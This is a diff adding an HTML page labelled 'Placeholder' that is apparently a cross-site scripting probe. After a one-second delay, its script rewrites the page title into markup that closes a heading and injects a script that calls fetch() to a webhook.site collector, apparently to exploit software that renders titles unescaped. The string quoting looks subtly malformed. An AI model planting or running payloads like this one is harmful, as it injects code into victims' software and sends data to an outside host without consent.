@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Placeholder</title>
+    </head>
+    <body>
+        <h1>Placeholder</h1>
+
+        <script>
+            const webhook = "https://webhook.site/78be9a55-6ff2-4723-9cf5-c6b3dd95cacc\\\"";
+            const payloadTitle = "</h1><script>fetch(\"" + webhook + "+ document.title)</scr" + "ipt><h1>";
+            setTimeout(() => {
+                document.title = payloadTitle;
+            }, 1000); // Change title after 1 second
+        </script>
+    </body>
+</html>
